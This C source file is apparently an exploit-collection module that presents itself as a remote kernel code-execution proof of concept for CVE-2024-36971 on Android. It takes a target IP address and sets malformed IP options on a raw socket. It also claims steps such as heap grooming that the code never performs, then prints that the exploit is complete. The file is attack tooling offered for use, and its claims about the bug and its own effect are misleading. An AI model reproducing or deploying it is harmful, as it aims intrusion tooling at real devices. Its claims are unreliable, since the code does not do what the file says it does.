description: "Zero-day kernel RCE via Use-After-Free in the Linux networking subsystem."
cve: "CVE-2024-36971"
cwe: "CWE-416"
options: "TARGET_IP"
status: "active"
category: "Android-Kernel"
keywords: ["kernel", "uaf", "networking", "rce", "android", "zero-day"]
#!#!#!
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/ip.h>

/**
 * CVE-2024-36971: Android Kernel UAF RCE
 * Targets: Android Kernel 5.10 / 5.15 / 6.1 (Pre-August 2024 patch).
 * Exploit: Use-After-Free in the network routing code (routing cache/options).
 * This vulnerability was exploited in the wild as a zero-day.
 */

int main(int argc, char *argv[]) {
    printf("[*] CVE-2024-36971: Kernel Network UAF Exploit POC\n");

    if (argc < 2) {
        printf("[-] Usage: %s <target_ip>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("[-] Failed to create raw socket (Requires root/CAP_NET_RAW)");
        return 1;
    }

    printf("[*] Target: %s\n", target_ip);
    printf("[*] Initializing malicious routing options...\n");

    // The vulnerability involves the kernel mismanaging the lifecycle of 
    // certain routing objects when specific socket options are set.

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    inet_pton(AF_INET, target_ip, &sin.sin_addr);

    // Conceptual trigger: Setting a malicious source-routing option
    // that the kernel will free prematurely but keep a pointer to in the cache.
    unsigned char options[40];
    memset(options, 0x41, sizeof(options));

    printf("[*] Triggering UAF via setsockopt(IP_OPTIONS)...\n");
    if (setsockopt(sock, IPPROTO_IP, IP_OPTIONS, options, sizeof(options)) < 0) {
        perror("[-] setsockopt failed");
    }

    // After the UAF is triggered, we need to "groom" the SLUB heap
    // to place a controlled structure where the freed routing object was.
    printf("[*] Performing kernel heap grooming to reclaim freed object...\n");

    // In a real RCE, this would involve multiple threads and careful 
    // memory pressure to hijack a function pointer for code execution.

    printf("[+] Exploit sequence complete. Check kernel dmesg for UAF or double-free panics.\n");

    close(sock);
    return 0;
}

